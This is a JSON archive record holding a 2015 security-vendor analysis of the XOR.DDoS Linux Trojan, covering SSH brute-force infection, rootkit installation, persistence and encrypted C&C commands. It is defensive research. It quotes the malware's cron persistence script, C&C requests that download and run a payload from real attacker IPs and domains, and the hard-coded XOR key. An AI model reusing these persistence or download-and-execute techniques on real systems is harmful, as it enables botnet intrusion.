{
    "id": "09fcd723-1a84-4e49-8457-307d31fe52b7",
    "created_at": "2023-01-12T15:03:40.652479Z",
    "updated_at": "2025-03-27T02:09:07.951437Z",
    "deleted_at": null,
    "sha1_hash": "f52217bacada4ea36a090fc81cb7821640afa3d7",
    "title": "2015-01-06 - Linux DDoS Trojan hiding itself with an embedded rootkit",
    "authors": "",
    "file_creation_date": "2022-05-28T04:00:08Z",
    "file_modification_date": "2022-05-28T04:00:08Z",
    "file_size": 401135,
    "plain_text": "# Linux DDoS Trojan hiding itself with an embedded rootkit\n\n**[blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/](https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/)**\n\n[Threat Intelligence Team 6 Jan 2015](https://blog.avast.com/author/threat-intelligence-team)\n\nAll you need to know about the newest Linux threat.\n\n\n-----\n\nAt the end of September 2014, a new\n\n[threat for the Linux operating system dubbed XOR.DDoS forming a botnet for distributed](http://blog.malwaremustdie.org/2014/09/mmd-0028-2014-fuzzy-reversing-new-china.html)\ndenial-of-service attacks was reported by the MalwareMustDie! group. The post mentioned\nthe initial intrusion of SSH connection, static properties of related Linux executable and\nencryption methods used. Later, we realized that the installation process is customized to a\nvictim’s Linux environment for the sake of running an additional rootkit component. In this\nblog post, we will describe the installation steps, the rootkit itself, and the communication\nprotocol for getting attack commands.\n\n## Installation Script & Infection Vector\n\nThe infection starts by an attempt to brute force SSH login credentials of the root user. If\n[successful, attackers gain access to the compromised machine, then install the Trojan](https://www.avast.com/c-trojan)\nusually via a shell script. The script contains procedures like main, check, compiler,\n_uncompress, setup, generate, upload, checkbuild, etc. and variables like __host_32__,_\n___host_64__, __kernel__, __remote__, etc. The main procedure decrypts and selects the_\nC&C server based on the architecture of the system.\n\nIn the requests below, iid parameter is the MD5 hash of the name of the kernel version. The\nscript first lists all the modules running on the current system by the command lsmod. Then it\ntakes the last one and extracts its name and the parameter vermagic. In one of our cases,\nthe testing environment runs under “3.8.0-19-generic\\ SMP\\ mod_unload\\ modversions\\ 686\\\n“, which has the MD5 hash equal to CE74BF62ACFE944B2167248DD0674977.\n\n\n-----\n\nThree GET requests are issued to C&C. The first one is performed by the check procedure\n(note the original misspelling):\n\nrequest:\nGET /check?iid=CE74BF62ACFE944B2167248DD0674977&kernel=3.8.0reply:\n1001|CE74BF62ACFE944B2167248DD0674977|header directory is exists!\n\nThen compiler procedure issues another GET request in which parameters like C&C servers,\nversion info, etc, are passed to the server where they are compiled into a newly created\nexecutable:\n\nrequest:\nGET /compiler?iid=CE74BF62ACFE944B2167248DD0674977&username=admin\n&password=admin&ip=103.25.9.245:8005%7C103.240.141.50:8005%7C\n66.102.253.30:8005%7Cndns.dsaj2a1.org:8005%7Cndns.dsaj2a.org:8005%7C\nndns.hcxiaoao.com:8005%7Cndns.dsaj2a.com:8005\n&ver=3.8.0-19generic%5C%20SMP%5C%20mod_unload%5C%20modversions%5C%20686%5C%20\n&kernel=3.8.0\nreply:\n1001|CE74BF62ACFE944B2167248DD0674977|header directory is exists!\n\nFinally, the third GET request downloads the customized version of the Trojan's binary in the\nform of a gzip archive, which is unpacked and executed:\n\nrequest:\nGET /upload/module/CE74BF62ACFE944B2167248DD0674977/build.tgz\nreply:\n1001|CE74BF62ACFE944B2167248DD0674977|create ok\n\nThe previous steps run only in the case that there already is a built version for the current\nkernel version on the server side. If not, the script locates the kernel headers in\n_/lib/modules/%s/build/ directory, where %s means the return value after calling the command_\n_uname with parameter r, then packs all files and uploads them to the C&C server using a_\ncustom uploader called mini. The steps of the first scenario follows.\n\nThe rootkit component is a loadable kernel module (LKM). To install it successfully on a\nsystem, the vermagic value of LKM needs to agree with the version of the kernel headers\ninstalled on the user's system. That’s the motivation behind previous installation steps. If\nprevious sequences fail, the script installs a Trojan omitting the rootkit component.\n\n## Structure & Persistence\n\nThe binary structure of the main executable is as follows:\n\n\n-----\n\nThe persistence of the Trojan is achieved in multiple ways. First, it is installed into the /boot/\ndirectory with a random 10-character string. Then a script with the identical name as the\nTrojan is created in the /etc/init.d directory. It is together with five symbolic links pointing to\nthe script created in /etc/rc%u.d/S90%s, where %u runs from 1 to 5 and %s is substitute with\nthe random. Moreover, a script /etc/cron.hourly/cron.sh is added with the content:\n\n#!/bin/sh\n\nPATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin'\n\nfor i in `cat /proc/net/dev|grep :|awk -F: {',27h,'print $1',27h,'}`; do ifconfig $i up& done\n\ncp /lib/udev/udev /lib/udev/debug\n\n/lib/udev/debug\n\nThe line “*/3 * * * * root /etc/cron.hourly/cron.sh” is inserted in the crontab.\n\nThe functionality of the main executable lies in three infinite loops responsible for 1.\ndownloading and executing instructions in a bot's configuration file, 2. reinstalling itself as the\n_/lib/udev/udev file, and 3. performing flooding commands. The configuration file contains four_\ncategories of lists: md5, denyip, filename and rmfile and mean killing a running process\nbased on its CRC checksum, on the active communication with an IP from the list, on a\nfilename, and finally removing a file with a specified name. In the next figure, a fragment of\nthe config file is displayed (known filenames connected with competing flooding Trojans are\nhighlighted):\n\n\n-----\n\nThe lists of processes to kill or remove before its own installation is typical for flooding\nTrojans.\n\nAlso we have to note that there is a variant of this Trojan compiled for the ARM architecture.\nThis suggests that the list of potentially infected systems (besides 32-bit and 64-bit Linux\nweb servers and desktops) is extended for routers, Internet of Things devices, NAS storages\nor 32-bit ARM servers (however, it has not been observed in the wild yet). It contains an\nadditional implementation of the download-and-execute feature in an infinite loop called\n_daemondown:_\n\nA few days ago, a new 32-bit variant of this Trojan with few modifications was observed. The\nbot is installed as /lib/libgcc4.so file, the unique file containing its identification string (see\nlater) was /var/run/udev.pid, the initialization script was /etc/cron.hourly/udev.sh and the\nrootkit features were completely omitted. The presence of all these files could serve as an\nindicator of compromise (IoC).\n\n## LKM Rootkit\n\nTrojans for the Windows platform have used various rootkit features for a very long time. It is\nknown that some trojanized flooding tools had the Windows variant utilizing the Agony rootkit\n(its source code has been publicly shared and available since 2006) We presented research\n\n\n-----\n\nrelated to these malicious DDoS tools at Botconf 2014 in a survey called Chinese Chicken:\nMultiplatform-DDoS-Botnets. Now there is a flooding Trojan for Linux that also contains an\nembedded rootkit. It’s main functionality is to hide various aspects of the Trojan’s activity and\nis provided by procedures in the switch table:\n\nThe Trojan running in the userspace requests these features from the rootkit in the kernel by\nioctl command with a specific code (0x9748712). The presence of the rootkit is first checked\nby opening a process with the name rs_dev:\n\nThe own request needs two parameters: One specifies the number of the command to be\nperformed by the rootkit, and the other one is the number of the port to be hidden. Below is\nan example of how the Trojan hides the TCP port (notice the task value 3):\n\n\n-----\n\nBased on the procedure names, it is likely that the malware authors were inspired by the\n[open source project called Suterusu to build up their rootkit. The Trojan from last year called](https://github.com/mncoppola/suterusu)\n[Hand of Thief failed in its ambitions to be the first banking Trojan for Linux desktops. It also](https://blog.avast.com/2013/08/27/linux-trojan-hand-of-thief-ungloved/)\nborrowed part of its code from an existing open source project, namely methods of process\ninjection. The description of the project says “An LKM rootkit targeting Linux 2.6/3.x on\n[x86(_64), and ARM”. Another article related to Suterusu was published in January 2013.](http://poppopret.org/2013/01/07/suterusu-rootkit-inline-kernel-function-hooking-on-x86-and-arm/)\n\n## C&C communication\n\nThe communication is encrypted in both directions with the same hard-coded XOR key\n(BB2FA36AAA9541F0) as the configuration file. An additional file /var/run/sftp.pid containing\nan unique magic string of length 32 bytes is stored and utilized as an unique identifier of a\nvictim’s machine within the communication. There is a list of C&C commands, for which the\nbot listens to: To start flooding, to stop flooding, to download-and-execute, to self-update, to\nsend the MD5 hash of its memory, and to get list of processes to kill:\n\nThe list of C&Cs is stored in the shell script in the __remote__ variable. The Trojan first\nsends information about the running system to the C&C server (very likely to be displayed on\na panel of a botnet operator). The replies usually arrived in a form of a command. The\nheader of the command is 0x1C bytes long and is stored within a structure called Header.\nThe first command is to stop any flooding attack and the next one to start one with the list of\nhosts provided. The entries of the Header are shown below. Highlighted parameters are the\nsize of the total size of a command (Size, 0x102C), the task number (Order, 0x3, i.e.\n__cmd_start in the switch table), and the number of flooding tasks (Task_Num, 0xF):_\n\n\n-----\n\nThe rest of the flooding command contains an encrypted structure with attack tasks. After\ndecryption, we can see an IP address (red color) and ports (green color) which will be\nflooded by the Trojan and other parameters of the DDoS attack (e.g. grey color decides the\ntype of attack: SYN/DNS).\n\n## Acknowledgement\n\n[Thanks to my colleague Jaromír Hořejší for cooperation on this analysis. Pop-art was](https://twitter.com/jaromirhorejsi)\ncreated by the independent digital artist Veronika Begánová.\n\n## Sources\n\nHere are the samples connected with the analysis:\n\n\nInstall script BA84C056FB4541FE26CB0E10BC6A075585\n\n990F3CE3CDE2B49475022AD5254E5B\n\nXorddos Uploader 44153031700A019E8F9E434107E4706A705\n\nF032898D3A9819C4909B2AF634F18\n\n\nXorddos Trojan for\nEM_386\n\n\nAD26ABC8CD8770CA4ECC7ED20F37B510E\n\n827E7521733ECAEB3981BF2E4A96FBF\n\n\nBV:XorddosB [Trj]\n\nELF:XorddosJ [Trj]\n\nELF:XorddosA [Trj]\n\n\n-----\n\nXorddos Trojan for\nEM_x86_64\n\n\n859A952FF05806C9E0652A9BA18D521E57\n\n090D4E3ED3BEF07442E42CA1DF04B6\n\n\nXorddos Rootkit 6BE322CD81EBC60CFEEAC2896B26EF015D\n\n975AD3DDA95AE63C4C7A28B7809029\n\n\nELF:XorddosA [Trj]\n\nELF:XorddosD [Rtk]\n\nELF:XorddosI [Trj]\n\nELF:XorddosK [Trj]\n\n\nXorddos Trojan for\nEM_ARM\n\nXorddos Trojan no\nrootkit\n\n\n49963D925701FE5C7797A728A044F09562\n\nCA19EDD157733BC10A6EFD43356EA0\n\n24B9DB26B4335FC7D8A230F04F49F87B1F\n\n20D1E60C2FE6A12C70070BF8427AFF\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-01-06 - Linux DDoS Trojan hiding itself with an embedded rootkit.pdf"
    ],
    "report_names": [
        "2015-01-06 - Linux DDoS Trojan hiding itself with an embedded rootkit.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535820,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653710408,
    "ts_modification_date": 1653710408,
    "files": {
        "pdf": "https://archive.orkl.eu/f52217bacada4ea36a090fc81cb7821640afa3d7.pdf",
        "text": "https://archive.orkl.eu/f52217bacada4ea36a090fc81cb7821640afa3d7.txt",
        "img": "https://archive.orkl.eu/f52217bacada4ea36a090fc81cb7821640afa3d7.jpg"
    }
}